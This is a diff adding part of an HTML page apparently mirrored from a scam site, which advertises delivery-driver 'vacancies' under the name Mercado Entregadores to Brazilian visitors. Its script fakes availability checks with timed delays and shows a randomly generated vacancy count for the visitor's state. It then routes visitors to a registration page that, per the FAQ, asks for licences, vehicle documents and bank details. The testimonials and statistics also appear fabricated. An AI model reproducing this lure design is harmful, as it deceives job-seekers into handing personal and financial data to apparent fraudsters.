+            <div class="vaga-card animate-on-scroll" data-estado="TO"><div class="vaga-header"><span class="vaga-estado">Tocantins (TO)</span><span class="vaga-count">4 vagas</span></div><a href="cadastro.html" class="vaga-btn">Cadastrar</a></div>
+        </div>
+    </section>
+
+    <section class="vantagens">
+        <div class="section-title animate-on-scroll">
+            <h2>Vantagens de ser um Motorista Parceiro</h2>
+            <p>Junte-se a milhares de motoristas que já estão transformando seu tempo em oportunidades lucrativas</p>
+        </div>
+        <div class="vantagens-grid">
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"></rect><path d="M12 12h.01"></path><path d="M17 12h.01"></path><path d="M7 12h.01"></path></svg></div>
+                <h3>Pagamento Instantâneo</h3>
+                <p>Receba seu pagamento assim que finalizar a rota, sem precisar esperar.</p>
+            </div>
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
+                <h3>Horários Flexíveis</h3>
+                <p>Escolha quando e onde quer trabalhar, com total autonomia para organizar sua agenda.</p>
+            </div>
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 002 12v4c0 .6.4 1 1 1h2"></path><circle cx="7" cy="17" r="2"></circle><path d="M9 17h6"></path><circle cx="17" cy="17" r="2"></circle></svg></div>
+                <h3>Diversos Veículos</h3>
+                <p>Use seu veículo como fonte de renda: motos, carros, vans e mais.</p>
+            </div>
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="10" r="3"></circle><path d="M12 21.7C17.3 17 20 13 20 10a8 8 0 10-16 0c0 3 2.7 7 8 11.7z"></path></svg></div>
+                <h3>Rotas Otimizadas</h3>
+                <p>Sistema inteligente que agrupa entregas próximas, maximizando sua produtividade.</p>
+            </div>
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
+                <h3>Suporte Dedicado</h3>
+                <p>Equipe especializada disponível 24h para ajudar em qualquer situação.</p>
+            </div>
+            <div class="vantagem-card animate-on-scroll">
+                <div class="vantagem-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"></path></svg></div>
+                <h3>Melhores Ganhos</h3>
+                <p>Os melhores ganhos do mercado, valorizando cada entrega que você faz.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="depoimentos">
+        <div class="section-title animate-on-scroll">
+            <h2>O que nossos parceiros dizem</h2>
+            <p>Histórias reais de quem já faz parte do time</p>
+        </div>
+        <div class="depoimentos-grid">
+            <div class="depoimento-card animate-on-scroll">
+                <div class="depoimento-avatar" style="background: none;"><img src="fLHTJpW9/entregador-1.jpg" alt="Carlos Silva" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;"></div>
+                <div class="depoimento-stars">★★★★★</div>
+                <p class="depoimento-text">Trabalho há 8 meses e já consegui trocar de carro. O pagamento é muito rápido e as rotas são bem organizadas.</p>
+                <div class="depoimento-name">Carlos Silva</div>
+                <div class="depoimento-info">Motorista há 8 meses • São Paulo</div>
+            </div>
+            <div class="depoimento-card animate-on-scroll">
+                <div class="depoimento-avatar" style="background: none;"><img src="SKxKkmky/entregador-1-co-pia.jpg" alt="João Oliveira" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;"></div>
+                <div class="depoimento-stars">★★★★★</div>
+                <p class="depoimento-text">Melhor decisão que tomei! O suporte é excelente e os ganhos superam minhas expectativas.</p>
+                <div class="depoimento-name">João Oliveira</div>
+                <div class="depoimento-info">Motorista há 6 meses • Goiás</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="stats">
+        <div class="stats-grid">
+            <div class="stat-item animate-on-scroll"><h3 class="counter" data-target="27">0</h3><p>Estados Atendidos</p></div>
+            <div class="stat-item animate-on-scroll"><h3 class="counter" data-target="5000" data-prefix="+">0</h3><p>Parceiros Ativos</p></div>
+            <div class="stat-item animate-on-scroll"><h3 class="counter" data-target="24" data-suffix="h">0</h3><p>Suporte Disponível</p></div>
+        </div>
+    </section>
+
+    <section class="cta-banner">
+        <div class="cta-content animate-on-scroll">
+            <h2>Você está no controle. Você define seus ganhos.</h2>
+            <p>No Mercado Entregadores, acreditamos que você merece flexibilidade e recompensas justas pelo seu trabalho. Nossa plataforma foi projetada para valorizar cada entrega que você faz.</p>
+            <a href="#vagas" class="btn-primary">Começar agora <svg width="20" height="20" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg></a>
+        </div>
+    </section>
+
+    <section class="faq">
+        <div class="section-title animate-on-scroll"><h2>Perguntas Frequentes</h2></div>
+        <div class="faq-container">
+            <div class="faq-item active animate-on-scroll">
+                <div class="faq-question">Quais documentos são necessários para o cadastro?<svg class="faq-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
+                <div class="faq-answer">Para se cadastrar, você precisa de CNH válida, documento do veículo (CRLV) atualizado, comprovante de residência e dados bancários para recebimento dos pagamentos.</div>
+            </div>
+            <div class="faq-item animate-on-scroll">
+                <div class="faq-question">Como funciona o pagamento?<svg class="faq-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
+                <div class="faq-answer">Os pagamentos são realizados de forma instantânea. Assim que você finaliza a rota, o valor correspondente é transferido imediatamente para sua conta cadastrada.</div>
+            </div>
+            <div class="faq-item animate-on-scroll">
+                <div class="faq-question">Posso escolher minha área de atuação?<svg class="faq-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
+                <div class="faq-answer">Sim! Você tem autonomia para escolher a região onde deseja trabalhar e pode ajustar suas preferências diretamente no aplicativo do parceiro.</div>
+            </div>
+            <div class="faq-item animate-on-scroll">
+                <div class="faq-question">Quanto tempo leva para ser aprovado?<svg class="faq-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
+                <div class="faq-answer">O processo de aprovação geralmente leva de 3 a 7 dias úteis, dependendo da verificação dos documentos enviados. Você será notificado por e-mail sobre o status.</div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px;">
+            <img src="053Pbb0T/image.png" alt="" style="width: 40px; height: auto;">
+            <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                <span style="font-size: 24px; font-weight: 700; color: #2D3277;">mercado</span>
+                <span style="font-size: 24px; font-weight: 700; color: #2D3277;">entregadores</span>
+            </div>
+        </div>
+        <p><strong>Programa de Parceiros Entregadores</strong></p>
+        <p>Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+        <p class="footer-copy">© 2025 Mercado Entregadores. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        const cepOverlay = document.getElementById('cepOverlay');
+        const cepInput = document.getElementById('cepInput');
+        const verificarBtn = document.getElementById('verificarBtn');
+        const cepStep1 = document.getElementById('cepStep1');
+        const cepStep2 = document.getElementById('cepStep2');
+        const cepFilled = document.getElementById('cepFilled');
+        const cidadeEstado = document.getElementById('cidadeEstado');
+        const novoCepBtn = document.getElementById('novoCepBtn');
+        const confirmarBtn = document.getElementById('confirmarBtn');
+        const vagasGrid = document.getElementById('vagasGrid');
+        let estadoSelecionado = '';
+    
+        cepInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 5) value = value.slice(0, 5) + '-' + value.slice(5, 8);
+            e.target.value = value;
+        });
+    
+        verificarBtn.addEventListener('click', async () => {
+            const cep = cepInput.value.replace(/\D/g, '');
+            if (cep.length !== 8) { alert('Por favor, digite um CEP válido'); return; }
+            
+            verificarBtn.textContent = 'Verificando...';
+            verificarBtn.disabled = true;
+    
+            try {
+                // Trocado para BrasilAPI
+                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);
+                
+                if (!response.ok) { 
+                    throw new Error('CEP não encontrado'); 
+                }
+    
+                const data = await response.json();
+    
+                verificarBtn.textContent = 'Buscando localização...';
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                verificarBtn.textContent = 'Verificando disponibilidade...';
+                await new Promise(resolve => setTimeout(resolve, 1200));
+    
+                cepFilled.textContent = cepInput.value;
+                // Ajustado: BrasilAPI usa .city e .state
+                cidadeEstado.textContent = data.city + '/' + data.state;
+                estadoSelecionado = data.state;
+    
+                cepStep1.style.display = 'none';
+                cepStep2.style.display = 'block';
+    
+            } catch (error) { 
+                alert('CEP não encontrado ou erro na verificação.'); 
+                verificarBtn.textContent = 'Verificar CEP'; 
+                verificarBtn.disabled = false; 
+            }
+        });
+    
+        novoCepBtn.addEventListener('click', () => { 
+            cepStep2.style.display = 'none'; 
+            cepStep1.style.display = 'block'; 
+            cepInput.value = ''; 
+            verificarBtn.textContent = 'Verificar CEP'; 
+            verificarBtn.disabled = false; 
+        });
+    
+        confirmarBtn.addEventListener('click', () => {
+            cepOverlay.classList.add('hidden');
+            document.body.style.overflow = 'auto';
+            const userData = { 
+                cep: cepInput.value, 
+                cidade: cidadeEstado.textContent.split('index.html')[0], 
+                estado: estadoSelecionado 
+            };
+            localStorage.setItem('userData', JSON.stringify(userData));
+            filtrarVagasPorEstado(estadoSelecionado);
+        });
+    
+        function filtrarVagasPorEstado(uf) {
+            const todasVagas = vagasGrid.querySelectorAll('.vaga-card');
+            const vagasAleatorias = Math.floor(Math.random() * 11) + 5;
+            const bandeiras = {'AC':'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Bandeira_do_Acre.svg/45px-Bandeira_do_Acre.svg.png','AL':'https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Bandeira_de_Alagoas.svg/45px-Bandeira_de_Alagoas.svg.png','AP':'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Bandeira_do_Amap%C3%A1.svg/45px-Bandeira_do_Amap%C3%A1.svg.png','AM':'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Bandeira_do_Amazonas.svg/45px-Bandeira_do_Amazonas.svg.png','BA':'https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/Bandeira_da_Bahia.svg/45px-Bandeira_da_Bahia.svg.png','CE':'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Bandeira_do_Cear%C3%A1.svg/45px-Bandeira_do_Cear%C3%A1.svg.png','DF':'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Bandeira_do_Distrito_Federal_%28Brasil%29.svg/45px-Bandeira_do_Distrito_Federal_%28Brasil%29.svg.png','ES':'https://upload.wikimedia.org/wikipedia/commons/thumb/4/43/Bandeira_do_Esp%C3%ADrito_Santo.svg/45px-Bandeira_do_Esp%C3%ADrito_Santo.svg.png','GO':'https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Flag_of_Goi%C3%A1s.svg/45px-Flag_of_Goi%C3%A1s.svg.png','MA':'https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/Bandeira_do_Maranh%C3%A3o.svg/45px-Bandeira_do_Maranh%C3%A3o.svg.png','MT':'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Bandeira_de_Mato_Grosso.svg/45px-Bandeira_de_Mato_Grosso.svg.png','MS':'https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/Bandeira_de_Mato_Grosso_do_Sul.svg/45px-Bandeira_de_Mato_Grosso_do_Sul.svg.png','MG':'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Bandeira_de_Minas_Gerais.svg/45px-Bandeira_de_Minas_Gerais.svg.png','PA':'https://upload.wikimedia.org/wikipedia/commons/thumb/0/02/Bandeira_do_Par%C3%A1.svg/45px-Bandeira_do_Par%C3%A1.svg.png','PB':'https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/Bandeira_da_Para%C3%ADba.svg/45px-Bandeira_da_Para%C3%ADba.svg.png','PR':'https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Bandeira_do_Paran%C3%A1.svg/45px-Bandeira_do_Paran%C3%A1.svg.png','PE':'https://upload.wikimedia.org/wikipedia/commons/thumb/5/59/Bandeira_de_Pernambuco.svg/45px-Bandeira_de_Pernambuco.svg.png','PI':'https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/Bandeira_do_Piau%C3%AD.svg/45px-Bandeira_do_Piau%C3%AD.svg.png','RJ':'https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Bandeira_do_estado_do_Rio_de_Janeiro.svg/45px-Bandeira_do_estado_do_Rio_de_Janeiro.svg.png','RN':'https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Bandeira_do_Rio_Grande_do_Norte.svg/45px-Bandeira_do_Rio_Grande_do_Norte.svg.png','RS':'https://upload.wikimedia.org/wikipedia/commons/thumb/6/63/Bandeira_do_Rio_Grande_do_Sul.svg/45px-Bandeira_do_Rio_Grande_do_Sul.svg.png','RO':'https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Bandeira_de_Rond%C3%B4nia.svg/45px-Bandeira_de_Rond%C3%B4nia.svg.png','RR':'https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Bandeira_de_Roraima.svg/45px-Bandeira_de_Roraima.svg.png','SC':'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Bandeira_de_Santa_Catarina.svg/45px-Bandeira_de_Santa_Catarina.svg.png','SP':'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Bandeira_do_estado_de_S%C3%A3o_Paulo.svg/45px-Bandeira_do_estado_de_S%C3%A3o_Paulo.svg.png','SE':'https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Bandeira_de_Sergipe.svg/45px-Bandeira_de_Sergipe.svg.png','TO':'https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Bandeira_do_Tocantins.svg/45px-Bandeira_do_Tocantins.svg.png'};
+            todasVagas.forEach(card => {
+                if (card.dataset.estado === uf) {
+                    card.style.display = 'flex';
+                    const vagaCount = card.querySelector('.vaga-count');
+                    if (vagaCount) vagaCount.textContent = vagasAleatorias + ' vagas';
+                    const vagaEstado = card.querySelector('.vaga-estado');
+                    if (vagaEstado && !card.querySelector('.vaga-bandeira')) {
+                        const wrapper = document.createElement('div');
+                        wrapper.className = 'vaga-estado-wrapper';
+                        const bandeira = document.createElement('img');
+                        bandeira.className = 'vaga-bandeira';
+                        bandeira.src = bandeiras[uf] || '';
+                        bandeira.alt = 'Bandeira ' + uf;
+                        vagaEstado.parentNode.insertBefore(wrapper, vagaEstado);
+                        wrapper.appendChild(bandeira);
+                        wrapper.appendChild(vagaEstado);
+                    }
+                } else { card.style.display = 'none'; }
+            });
+        }
+    
+        document.body.style.overflow = 'hidden';
+    
+        document.querySelectorAll('a.vaga-btn[href="cadastro.html"]').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                const queryParams = new URLSearchParams();
+                Object.keys(userData).forEach(key => { if (userData[key] != null && typeof userData[key] !== 'object') queryParams.set(key, userData[key]); });
+                window.location.href = 'cadastrod41d.html?' + queryParams.toString();
+            });
+        });
+    
+        cepInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verificarBtn.click(); });
+    
+        const observerOptions = { threshold: 0.1, rootMargin: '0px 0px -50px 0px' };
+        const observer = new IntersectionObserver((entries) => { entries.forEach(entry => { if (entry.isIntersecting) entry.target.classList.add('visible'); }); }, observerOptions);
+        document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
+    
+        const counterObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const counter = entry.target;
+                    const target = parseInt(counter.dataset.target);
+                    const prefix = counter.dataset.prefix || '';
+                    const suffix = counter.dataset.suffix || '';
+                    const duration = 2000;
+                    const step = target / (duration / 16);
+                    let current = 0;
+                    const updateCounter = () => {
+                        current += step;
+                        if (current < target) { counter.textContent = prefix + Math.floor(current).toLocaleString('pt-BR') + suffix; requestAnimationFrame(updateCounter); }
+                        else { counter.textContent = prefix + target.toLocaleString('pt-BR') + suffix; }
+                    };
+                    updateCounter();
+                    counterObserver.unobserve(counter);
+                }
+            });
+        }, { threshold: 0.5 });
+        document.querySelectorAll('.counter').forEach(counter => counterObserver.observe(counter));
+    
+        document.querySelectorAll('.faq-question').forEach(question => {
+            question.addEventListener('click', () => {
+                const item = question.parentElement;
+                const isActive = item.classList.contains('active');
+                document.querySelectorAll('.faq-item').forEach(faq => faq.classList.remove('active'));
+                if (!isActive) item.classList.add('active');
+            });
+        });
+    
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"e116d703b7fe40798f27b675a7bf64cb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from informacoesconfirmadas.shop/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:07 GMT -->
+</html>
